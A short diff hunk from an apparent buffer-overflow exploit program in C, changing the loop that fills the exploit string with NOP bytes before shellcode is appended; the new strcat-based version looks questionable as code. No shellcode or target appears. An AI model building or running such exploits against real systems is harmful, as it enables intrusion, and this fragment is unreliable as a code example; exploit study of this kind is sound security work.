@@ -25,7 +25,7 @@ main ( int argc, char * argv[] )
 	// Offset 4 for the target buffer address
 	for (int i = 0; i < (sploit_len - shellcode_len - 4); ++i)
 	{
-		sploit_str[i] = nop;
+		strcat(sploit_str, nop);
 	}
 
 	// Append the shellcode
